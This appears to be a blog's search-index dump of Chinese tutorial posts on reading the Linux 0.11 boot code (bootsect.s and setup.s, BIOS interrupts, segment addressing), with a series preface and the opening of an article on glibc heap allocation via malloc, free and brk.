好了，本文的内容就结束了。这也标志着我们走完了第一个操作系统源码文件 bootsect.s，开始向下一个文件 setup.s 进发了！ 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"05 进入保护模式钱的最后一次折腾内存 书接上回，上回书咱们说到，操作系统已经完成了各种从硬盘到内存的加载，以及内存到内存的复制。 至此，整个 bootsect.s 的使命就完成了，也是我们品读完的第一个操作系统源码文件。之后便跳转到了 0x90200 这个位置开始执行，这个位置处的代码就是位于 setup.s 的开头，我们接着来看。 start: mov ax,#0x9000 ; this is done in bootsect already, but... mov ds,ax mov ah,#0x03 ; read cursor pos xor bh,bh int 0x10 ; save it in known place, con_init fetches mov [0],dx ; it from 0x90000. 又有个 int 指令。 前面的文章好好看过的话，一下就能猜出它要干嘛。还记不记得之前有个 int 0x13 表示触发 BIOS 提供的读磁盘中断程序？这个 int 0x10 也是一样的，它也是触发 BIOS 提供的显示服务中断处理程序，而 ah 寄存器被赋值为 0x03 表示显示服务里具体的读取光标位置功能。 具体 BIOS 提供了哪些中断服务，如何去调用和获取返回值，请大家自行寻找资料，这里只说结果。 这个 int 0x10 中断程序执行完毕并返回时，dx 寄存器里的值表示光标的位置，具体说来其高八位 dh 存储了行号，低八位 dl 存储了列号。 这里说明一下：计算机在加电自检后会自动初始化到文字模式，在这种模式下，一屏幕可以显示 25 行，每行 80 个字符，也就是 80 列。 那下一步 mov [0],dx 就是把这个光标位置存储在 [0] 这个内存地址处。注意，前面我们说过，这个内存地址仅仅是偏移地址，还需要加上 ds 这个寄存器里存储的段基址，最终的内存地址是在 0x90000 处，这里存放着光标的位置，以便之后在初始化控制台的时候用到。 所以从这里也可以看出，这和我们平时调用一个方法没什么区别，只不过这里的寄存器的用法相当于入参和返回值，这里的 0x10 中断号相当于方法名。 这里又应了之前说的一句话，操作系统内核的最开始也处处都是 BIOS 的调包侠，有现成的就用呗。 再接下来的几行代码，都是和刚刚一样的逻辑，调用一个 BIOS 中断获取点什么信息，然后存储在内存中某个位置，我们迅速浏览一下就好咯。 比如获取内存信息。 ; Get memory size (extended mem, kB) mov ah,#0x88 int 0x15 mov [2],ax 获取显卡显示模式。 ; Get video-card data: mov ah,#0x0f int 0x10 mov [4],bx ; bh = display page mov [6],ax ; al = video mode, ah = window width 检查显示方式并取参数 ; check for EGA/VGA and some config parameters mov ah,#0x12 mov bl,#0x10 int 0x10 mov [8],ax mov [10],bx mov [12],cx 获取第一块硬盘的信息。 ; Get hd0 data mov ax,#0x0000 mov ds,ax lds si,[4*0x41] mov ax,#INITSEG mov es,ax mov di,#0x0080 mov cx,#0x10 rep movsb 获取第二块硬盘的信息。 ; Get hd1 data mov ax,#0x0000 mov ds,ax lds si,[4*0x46] mov ax,#INITSEG mov es,ax mov di,#0x0090 mov cx,#0x10 rep movsb 以上原理都是一样的。 我们就没必要细琢磨了，对操作系统的理解作用不大，只需要知道最终存储在内存中的信息是什么，在什么位置，就好了，之后会用到他们的。 内存地址 长度(字节) 名称 0x90000 2 光标位置 0x90002 2 扩展内存数 0x90004 2 显示页面 0x90006 1 显示模式 0x90007 1 字符列数 0x90008 2 未知 0x9000A 1 显示内存 0x9000B 1 显示状态 0x9000C 2 显卡特性参数 0x9000E 1 屏幕行数 0x9000F 1 屏幕列数 0x90080 16 硬盘1参数表 0x90090 16 硬盘2参数表 0x901FC 2 根设备号 由于之后很快就会用 c 语言进行编程，虽然汇编和 c 语言也可以用变量的形式进行传递数据，但这需要编译器在链接时做一些额外的工作，所以这么多数据更方便的还是双方共同约定一个内存地址，我往这里存，你从这里取，就完事了。这恐怕是最最原始和直观的变量传递的方式了。 把这些信息存储好之后，操作系统又要做什么呢？我们继续往下看。 cli ; no interrupts allowed ; 就一行 cli，表示关闭中断的意思。 因为后面我们要把原本是 BIOS 写好的中断向量表给覆盖掉，也就是给破坏掉了，写上我们自己的中断向量表，所以这个时候是不允许中断进来的。 继续看。 ; first we move the system to it's rightful place mov ax,#0x0000 cld ; 'direction'=0, movs moves forward do_move: mov es,ax ; destination segment add ax,#0x1000 cmp ax,#0x9000 jz end_move mov ds,ax ; source segment sub di,di sub si,si mov cx,#0x8000 rep movsw jmp do_move ; then we load the segment descriptors end_move: ... 看到后面那个 rep movsw 熟不熟悉，一开始我们把操作系统代码从 0x7c00 移动到 0x90000 的时候就是用的这个指令，来图回忆一下。 同前面的原理一样，也是做了个内存复制操作，最终的结果是，把内存地址 0x10000 处开始往后一直到 0x90000 的内容，统统复制到内存的最开始的 0 位置，大概就是这么个效果。 由于之前的各种加载和复制，导致内存看起来很乱，是时候进行一波取舍和整理了，我们重新梳理一下此时的内存布局。 栈顶地址仍然是 0x9FF00 没有改变。 0x90000 开始往上的位置，原来是 bootsect 和 setup 程序的代码，现 bootsect 的一部分代码在已经被操作系统为了记录内存、硬盘、显卡等一些临时存放的数据给覆盖了一部分。 内存最开始的 0 到 0x80000 这 512K 被 system 模块给占用了，之前讲过，这个 system 模块就是除了 bootsect 和 setup 之外的全部程序链接在一起的结果，可以理解为操作系统的全部。 那么现在的内存布局就是这个样子。 好了，记住上面的图就好了，这回是不是又重新清晰起来了？之前的什么 0x7c00，已经是过去式了，赶紧忘掉它，向前看！ 接下来，就要进行有点技术含量的工作了，那就是模式的转换，需要从现在的 16 位的实模式转变为之后 32 位的保护模式，这是一项大工程！也是我认为的这趟操作系统源码旅程中，第一个颇为精彩的地方，大家做好准备！ 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:3:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"原文地址 你管这破玩意叫操作系统源码 | 第三回 做好最最基础的准备工作 你管这破玩意叫操作系统源码 | 第四回 把自己在硬盘里的其他部分也放到内存来 你管这破玩意叫操作系统源码 | 第五回 进入保护模式前的最后一次折腾内存 ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:4:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第一篇","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"Linux-0.11-01 本文是Linux 0.11系列学习记录的正式的第一篇。 ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"前言 从这一篇开始，您就将跟着我一起进入这操作系统的梦幻之旅！ 别担心，每一章的内容会非常的少，而且你也不要抱着很大的负担去学习，只需要像读小说一样，跟着我一章一章读下去就好。 ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"01 最开始的两行代码 当按下开机键的那一刻，在主板上提前写死的固件程序 BIOS 会将硬盘中启动区的 512 字节的数据，原封不动复制到内存中的 0x7c00 这个位置，并跳转到那个位置进行执行。 启动区的定义非常简单，只要硬盘中的 0 盘 0 道 1 扇区的 512 个字节的最后两个字节分别是 0x55 和 0xaa，那么 BIOS 就会认为它是个启动区。 所以对于我们理解操作系统而言，此时的 BIOS 仅仅就是个代码搬运工，把 512 字节的二进制数据从硬盘搬运到了内存中而已。所以作为操作系统的开发人员，仅仅需要把操作系统最开始的那段代码，编译并存储在硬盘的 0 盘 0 道 1 扇区即可。之后 BIOS 会帮我们把它放到内存里，并且跳过去执行。 而 Linux-0.11 的最开始的代码，就是这个用汇编语言写的 bootsect.s，位于 boot 文件夹下。 通过编译，这个 bootsect.s 会被编译成二进制文件，存放在启动区的第一扇区。 随后就会如刚刚所说，由 BIOS 搬运到内存的 0x7c00 这个位置，而 CPU 也会从这个位置开始，不断往后一条一条语句无脑地执行下去。 那我们的梦幻之旅，就从这个文件的第一行代码开始啦！ mov ax,0x07c0 mov ds,ax 好吧，先连续看两行。 这段代码是用汇编语言写的，含义是把 0x07c0 这个值复制到 ax 寄存器里，再将 ax 寄存器里的值复制到 ds 寄存器。那其实这一番折腾的结果就是，让 ds 这个寄存器里的值变成了 0x07c0。 ds 是一个 16 位的段寄存器，具体表示数据段寄存器，在内存寻址时充当段基址的作用。啥意思呢？就是当我们之后用汇编语言写一个内存地址时，实际上仅仅是写了偏移地址，比如： mov ax, [0x0001] 实际上相当于 mov ax, [ds:0x0001] ds 是默认加上的，表示在 ds 这个段基址处，往后再偏移 0x0001 单位，将这个位置的内存数据，复制到 ax 寄存器中。 形象地比喻一下就是，你和朋友商量去哪玩比较好，你说天安门、南锣鼓巷、颐和园等等，实际上都是偏移地址，省略了北京市这个基址。 当然你完全可以说北京天安门、北京南锣鼓巷这样，每次都加上北京这个前缀。不过如果你事先和朋友说好，以下我说的地方都是北京市里的哈，之后你就不用每次都带着北京市这个词了，是不是很方便？ 那 ds 这个数据段寄存器的作用就是如此，方便了描述一个内存地址时，可以省略一个基址，没什么神奇之处。 ds : 0x0001 北京市 : 南锣鼓巷 再看，这个 ds 被赋值为了 0x07c0，由于 x86 为了让自己在 16 位这个实模式下能访问到 20 位的地址线这个历史因素（不了解这个的就先别纠结为啥了），所以段基址要先左移四位。那 0x07c0 左移四位就是 0x7c00，那这就刚好和这段代码被 BIOS 加载到的内存地址 0x7c00 一样了。 也就是说，之后再写的代码，里面访问的数据的内存地址，都先默认加上 0x7c00，再去内存中寻址。 为啥统一加上 0x7c00 这个数呢？这很好解释，BIOS 规定死了把操作系统代码加载到内存 0x7c00，那么里面的各种数据自然就全都被偏移了这么多，所以把数据段寄存器 ds 设置为这个值，方便了以后通过这种基址的方式访问内存里的数据。 OK，赶紧消化掉前面的知识，那本篇就到此为止，只讲了两行代码，知识量很少，我没骗你吧。 希望你能做到，对 BIOS 将操作系统代码加载到内存 0x7c00，以及我们通过 mov 指令将默认的数据段寄存器 ds 寄存器的值改为 0x07c0 方便以后的基址寻址方式，这两件事在心里认可，并且没有疑惑，这才方便后面继续进行。 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ——- 本回扩展资料 ——- 有关寄存器的详细信息，可以参考 Intel 手册： Volume 1 Chapter 3.2 OVERVIEW OF THE BASIC EXECUTION ENVIRONMEN 有关计算机启动部分的原理如果还不清楚，可以看我之前的一篇文章了解一下： 计算机的启动过程 如果想了解计算机启动时详细的初始化过程，还是得参考 Intel 手册： Volume 3A Chapter 9 PROCESSOR MANAGEMENT AND INITIALIZATION ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"02 自己给自己挪个地儿 书接上回，上回书咱们说到，CPU 执行操作系统的最开始的两行代码。 mov ax,0x07c0 mov ds,ax 将数据段寄存器 ds 的值变成了 0x07c0，方便了之后访问内存时利用这个段基址进行寻址。 接下来我们带着这两行代码，继续往下看几行。 mov ax,0x07c0 mov ds,ax mov ax,0x9000 mov es,ax mov cx,#256 sub si,si sub di,di rep movw 此时 ds 寄存器的值已经是 0x07c0 了，然后又通过同样的方式将 es 寄存器的值变成 0x9000，接着又把 cx 寄存器的值变成 256（代码里确实是用十进制表示的，与其他地方有些不一致，不过无所谓）。 再往下看有两个 sub 指令，这个 sub 指令很简单，比如 sub a,b 就表示 a = a - b 那么代码中的 sub si,si 就表示 si = si - si 所以如果 sub 后面的两个寄存器一模一样，就相当于把这个寄存器里的值清零，这是一个基本玩法。 那就非常简单了，经过这些指令后，以下几个寄存器分别被附上了指定的值，我们梳理一下。 ds = 0x07c0 es = 0x9000 cx = 256 si = 0 di = 0 还记得上一讲画的 CPU 寄存器的总图么？此时就是这样了 干嘛要给这些毫不相干的寄存器附上值呢？其实就是为下一条指令服务的，就是 rep movw 其中 rep 表示重复执行后面的指令。 而后面的指令 movw 表示复制一个字（word 16位），那其实就是不断重复地复制一个字。 那下面自然就有三连问： 重复执行多少次呢是 cx 寄存器中的值，也就是 256 次。 从哪复制到哪呢是从 ds:si 处复制到 es:di 处。 一次复制多少呢刚刚说过了，复制一个字，16 位，也就是两个字节。 上面是直译，那把这段话翻译成更人话的方式讲出来就是，将内存地址 0x7c00 处开始往后的 512 字节的数据，原封不动复制到 0x90000 处。 就是下图的第二步。 没错，就是这么折腾了一下。现在，操作系统最开头的代码，已经被挪到了 0x90000 这个位置了。 再往后是一个跳转指令。 jmpi go,0x9000 go: mov ax,cs mov ds,ax 仔细想想或许你能猜到它想干嘛。 jmpi 是一个段间跳转指令，表示跳转到 0x9000:go 处执行。 还记得上一讲说的 段基址 : 偏移地址 这种格式的内存地址要如何计算吧？段基址仍然要先左移四位，因此结论就是跳转到 0x90000 + go 这个内存地址处执行。忘记的赶紧回去看看，这才过了一回哦，要稳扎稳打。 再说 go，go 就是一个标签，最终编译成机器码的时候会被翻译成一个值，这个值就是 go 这个标签在文件内的偏移地址。 这个偏移地址再加上 0x90000，就刚好是 go 标签后面那段代码 mov ax,cs 此时所在的内存地址了。 那假如 mov ax,cx 这行代码位于最终编译好后的二进制文件的 0x08 处，那 go 就等于 0x08，而最终 CPU 跳转到的地址就是 0x90008 处。 所以到此为止，前两回的内容，其实就是一段 512 字节的代码和数据，从硬盘的启动区先是被移动到了内存 0x7c00 处，然后又立刻被移动到 0x90000 处，并且跳转到此处往后再稍稍偏移 go 这个标签所代表的偏移地址处，也就是 mov ax,cs 这行指令的位置。 仍然是保持每回的简洁，本文就讲到这里，希望大家还跟得上，接下来的下一回，我们就把目光定位到 go 标签处往后的代码，看看他又要折腾些什么吧。 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ——- 本回扩展与延伸 ——- 有关寄存器的详细信息，可以参考 Intel 手册： Volume 1 Chapter 3.2 OVERVIEW OF THE BASIC EXECUTION ENVIRONMEN 如果想了解汇编指令的信息，可以参考 Intel 手册： Volume 2 Chapter 3 ~ Chapter 5 比如本文出现的 sub 指令，你完全没必要去百度它的用法，直接看手册。 Intel 手册对于理解底层知识非常直接有效，但却没有很好的中文翻译版本，因此让许多人望而生畏，只能去看一些错误百出的中文二手资料和博客。因此我也发起了一个 Intel 手册翻译计划，就在阅读原文的 GitHub 里，感兴趣的同胞们可以参与进来，我们共同完成一份伟大的事。 希望你跟完整个系列，收获的不仅仅是 Linux 0.11 源码的了解，更是自己探索问题和寻找答案的一个科学思考方式。 所以每次本回扩展与延伸这里，希望你也能每天进步一点点，实践起来，再不济，也能多学几个英语单词不是？ ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:3:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"原文地址 你管这破玩意叫操作系统源码 | 第一回 最开始的两行代码 你管这破玩意叫操作系统源码 | 第二回 自己给自己挪个地儿 ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:4:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列序言","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"本文是Linux 0.11系列学习记录的序言篇，主要是闪客在微信公众号上发布的相关内容的整理总结。 ","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"前言 本系列是闪客sun的最新微信公众号技术文章系列–《你管这破玩意叫操作系统源码》。闪客sun的文章基本全是干货，懂的都懂，这次的新系列实在是掐中了很多人的痛点，能很好地帮助大家深入理解 Linux 操作系统。 本着学习和分享的目的，blog 会进行该系列文章的同步更新，希望能有更多想学习技术干货的人了解到闪客sun和他的技术文。在每篇文章的末尾，会放上公众号链接，希望大家在学习的同时，也多多支持闪客sun。 公众号 低并发编程： 以下为原文： 写在前面 核心信息提炼到开头，以节约大家的时间。 要干嘛：写一个系列 啥目的：带大家把 Linux 0.11 核心代码与操作系统的设计思想啃下来 叫啥名：你管这破玩意叫操作系统源码 — 像小说一样品读 Linux 0.11 核心代码 发文时间：每周一和每周四 预计章节：60 回 互动方式：微信群（文末有加入方式） 系列整体布局： 第一部分：进入内核前的苦力活 第二部分：大战前期的初始化工作 第三部分：一个新进程的诞生 第四部分：shell 程序的到来 第五部分：从一个命令的执行看操作系统各模块的运作 第六部分：操作系统哲学与思想 OK，以上就是要说的重要的事，以下是啰嗦的部分。 我是分割线 每个程序员都有一个操作系统梦，而操作系统也是每个程序员的心结。 很粗糙地了解一点操作系统知识，一知半解的，已经无法满足当下程序员的口味了。但要说深入剖析操作系统，又是大部分程序员都很惶恐的一件事。那如果是要读一遍操作系统源码，那简直跟要了命一样。 其实，操作系统的源码并没有那么可怕，可为什么即便是 Linux 0.11 这种代码量最少的版本，仍然令很多人望而却步呢？ 为什么望而却步 其实，很多优秀的操作系统书籍都是以 Linux 0.11 这个经典版本为研究对象进行讲解的，比如《Linux 内核设计的艺术》、 《Linux 内核完全注释》等。但我们想一下，当我们读一本小说时，为什么即便是非常大部头的小说，也能酣畅淋漓从头读到尾？ 先不直接回答这个问题，我们看一下**《天龙八部》**的最开头： “青光闪动，一柄青钢剑倏地刺出，指向中年汉子左肩，使剑少年不待剑招用老，腕抖剑斜，剑锋已削向那汉子右颈。那中年汉子…” 记住这个感觉没？我们再看一下《Linux 内核设计的艺术》的最开头： “对于操作系统而言，稳定且可靠地运行是最重要的。现行技术方案是将用户进程与用户进程之间、用户进程与操作系统之间进行分离，操作系统可以管理用户进程，但是用户进程之间不能相互干预 …” 好了，不用读下去了，这句话看似高瞻远瞩地从宏观上帮我们梳理操作系统体系结构，但对于尚不了解操作系统的人来说，完全不知道它在说什么，只有劝退的作用。 虽然说思想很重要，但你在没有任何细节做积累时去强行进行思想的拔高，是拔不上去的，还不如一直保持一张白纸的状态。 反观《天龙八部》的开头，连人物的名字都没有，更别说梳理整个体系结构了，直接上来一个精彩镜头，让你迅速进入故事情节。 可是读完整部小说的读者，无一不对里面的人物如数家珍，对大理的风光仿佛亲眼看见了一般，对宋辽矛盾的激烈感同身受。 为什么会这样呢？因为一切的爱恨情仇和民族矛盾，都是我们通过一个个人物和事件的刻画，感悟出来的。只有自己感悟出来的知识和靠自己总结出来的结论，才真正属于自己。 而那些一上来就试图把整个脉络给你梳理清楚的尝试，对于新手来说无一不是徒劳，即便是死记硬背记住了，也终究不是属于自己的知识，无法感同身受。 我学习操作系统的过程中，也有这样的感觉。 我曾一次次试图从一个上帝视角来看操作系统的知识体系，从宏观层面跟着大部头书籍梳理操作系统的整体逻辑，我发现无一不是以失败告终。 而当我放下包袱，用读一本小说的心态来去阅读 Linux 源代码时，我发现，我从来没有去想着梳理出什么体系，但不知道从哪一行代码开始，整个操作系统的体系结构已经较为清晰地出现在我面前了，竟是那么的不知不觉。 而且我也清晰地知道，这样的体系是怎么一步步从第一行代码开始，逐步建立起来的。 虽然我还没有触类旁通，真正理解操作系统的哲学与设计思想，也不能凭自己的想法写出一个新的操作系统来，但最初的这道坎我算是过去了。 所以我想把这些梳理一下，分享给大家。同时也能更好地让自己巩固细节，最终真正理解操作系统的思想，达到触类旁通。 如何分享呢？ 打算写个新系列 我并不是说《Linux 内核设计的艺术》这本书不好，而是想着能不能也以写小说一样的心态和方式，来给大家从头到尾讲述这部 Linux 0.11 的源码。 我打算把这个系列叫做 《你管这破玩意叫操作系统源码 —— 像小说一样品读 Linux 0.11 核心代码》 在这里面，我不会经常把操作系统的体系架构挂在嘴边，时时刻刻强行塞到你的脑子里，而是通过一行一行代码逐渐带入情节，最终让你不知不觉地发现，原来整个操作系统的体系就这样一点一点建立起来了。 本系列的每一章内容都很短，千万不要有心里负担，而正是这些简单的事情联系到一起，就构成了整个操作系统的复杂的设计。 所以也导致了，单独看任何一章都不会有显著的收获，但如果整个系列都能跟下来，并且每一章的内容都能做出思考，把不懂的地方及时解决，我保证你会对操作系统有一个全新的，深入到细节的认识。 希望你跟我走完这个系列，也能发出一句感叹，原来操作系统源码不过如此，就是这么个破玩意而已！ 但同时，你也要有耐心，你不要总想着，读到这了我怎么还是没觉得自己懂操作系统了呢？怎么还是没讲多进程如何调度呢？记住，享受当下，当下你学的每一个看似没啥用的知识，都是后面豁然开朗这种感觉的基石。 等等，我记得闪客之前也说要写个自制操作系统系列呢？不过好像… 万一中途又鸽了怎么办 话说回来，我的老读者有点惨，之前总是看我信誓旦旦说要写操作系统的系列，但无一例外都是中途失败了。 博客园上写过，公众号上也写过，而公众号里的好多读者就是被我的自制操作系统系列骗进来的，然后写到第五章我就鸽了，实在太过分了！ 所以接下来自然就有一个大家都关心的问题了，就是这次会不会又鸽呢？ 我可以肯定的是，这次绝对绝对绝对绝对绝对绝对不会中途鸽了！因为我此时此刻已经把全部的大纲以及文章的前 33 章的内容写好了，就藏在我的石墨文档里。后面的内容我打算根据前面的反馈和问答，不断做出调整。 没错，总共我计划分六大部分，前四部分你会看到从开机一直到操作系统的最后一行代码的全部主流程，第五部分将通过一个命令的执行将操作系统各个模块的运作方式串一遍，而第六部分会做一个思想的拔高，这也是我自己给自己挖的一个坑和挑战。 而六大部分对应到 Linux 0.11 源码从开机到 shell 的流程图，是这样的。 其实本可以早早就开始边写边发布，但想着要是这次中途又鸽了读者，着实有点不好意思。所以就冒着中途写不下去的风险，先把大部分文章提前写好。 但我也给自己留了个后路，就是只提前写了 33 章，也够大家看好几个月了，要是大家不捧场，我后面就不更了，哼（傲娇表情.gif）！ 提前写好有个好处，就是写到后面的时候，发现前面有些地方可以提前做个引子，这样整个系列就更完整了，可以前后呼应，可读性和收获也会大大增加。 如何互动 虽然已经提前写好，但中途还是要不断接受读者反馈和答疑，以便更好修正文章的内容，并且做一些知识点的补充，这也是我对自己的要求和考验。 所以建立微信群增加互动性。 在这里你可以不断对文章内容提出反馈意见，以及和不同读者进行心得交流，以及进行催更呐喊。不要觉得你的意见无法左右这个系列，要知道，这个系列的名称就是低并发编程读者群的读者们群体的智慧想出来的。 我觉得这也是公众号里更新系列的一个优势，就是与读者的距离更近，更方便随时讨论和交流，互相促进成长。 加入方式是加我微信好友，备注 os-昵称-其他信息 比如 os-闪客-Java 我会将所有备注为本格式的好友邀请至微信群。 一定要按备注要求来哦~ 我是华丽的分割线 好了！本篇文章就当做开篇词，今后不出意外至少每周一周四更新，每一个大部分结束后会看情况留一段时间集中消化与总结。 不过会以文章质量和准确性为主，不会带着问题强行按时更新的。 本系列完全免费，直到所有章节全部结束，所以你们的喜欢和传播就是对我最大的支持，可以星标我的公众号防止错过更新提醒。 公众号虽然与读者距离更近，但它却是个封闭的空间，平台和搜索引擎不会主动向外扩散，所以如果没有人主动帮忙传播，会一直限制在公众号粉丝的圈子里，越到后面看的人也会越少。 这也是很多公众号系列中途腰斩的因素之一，所以还是希望大家喜欢这个系列的话，可以多多帮忙传播，比如朋友圈打打卡，或者如果你也写博客的话，文章里提提我，都是可以帮到这个系列活下去的重要途径，在此多谢各位捧场啦！ 同时我也会在 GitHub 上进行同步，因为公众号文章发了之后就无法修改，也没法进行整体调整。感兴趣的也可以点击阅读原文进入 GitHub。但我同步应该不会很及时，还是以公众号为主战场，毕竟时间和精力有限。 那就让我们一起期待吧！ ","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"原文地址 闪客新系列！你管这破玩意叫操作系统源码 ","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-序","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"Linux堆内存管理深入分析","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/","tags":["heap"],"title":"Linux堆内存管理深入分析","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"Linux堆内存管理深入分析 ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:0:0","tags":["heap"],"title":"Linux堆内存管理深入分析","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"1. 堆概述 ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:0","tags":["heap"],"title":"Linux堆内存管理深入分析","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"1. 概念 程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，增长方向为由低到高。一般称管理堆的那部分程序为堆管理器。 堆管理器处于用户程序与内核中间，提供主要以下功能： 响应用户的申请内存请求，向OS申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法来管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与OS交互，申请新的内存。 管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给OS，而是由堆管理器进行管理。这些释放的内存在堆管理器的管理下，可以来响应用户新申请的内存的请求。 目前Linux发行版中使用的堆分配器是glibc中的堆分配器：ptmalloc2，其主要通过 malloc/free 函数来分配和释放内存块。 注：Linux 内存管理的一个基本思想：只有在真正访问一个地址的时候，OS才会建立虚拟页面与物理页面的映射关系。基于这个思想，OS虽然已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到响应的内存时，OS才会真正分配物理页面给用户使用。 ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:1","tags":["heap"],"title":"Linux堆内存管理深入分析","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"2. 堆的基本操作 堆分配：malloc 在 glibc 的 malloc.c 中，其说明如下： /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ malloc 函数返回的是对应大小字节的内存块的指针。 当n = 0时，返回当前系统允许的堆的最小内存块 当n为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。 堆释放：free 在 glibc 的 malloc.c 中，其说明如下： /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ free 函数会释放由指针 p 所指向的内存块。该内存块可能是 malloc f分配的，也可能是类似函数 realloc 等分配的。 当 p 为空指针时，函数不执行任何操作。 当 p 已经被释放后，再次释放会出现意料之外的效果，这其实就是 Double Free(双重释放)。 除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给OS，以便于减小程序所使用的内存空间。 内存分配涉及到的系统调用 无论是 malloc 还是 free，在动态申请和释放内存时，并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。 堆内存块申请 对于堆内存的分配操作，OS提供了 brk 函数，glibc 提供了 sbrk 函数，我们可以通过增加 brk 的大小来向OS申请内存。 初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同 不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。 开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。 具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示： 代码例子： /* sbrk and brk example */ #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { void *curr_brk, *tmp_brk = NULL; printf(\"Welcome to sbrk example:%d\\n\", getpid()); /* 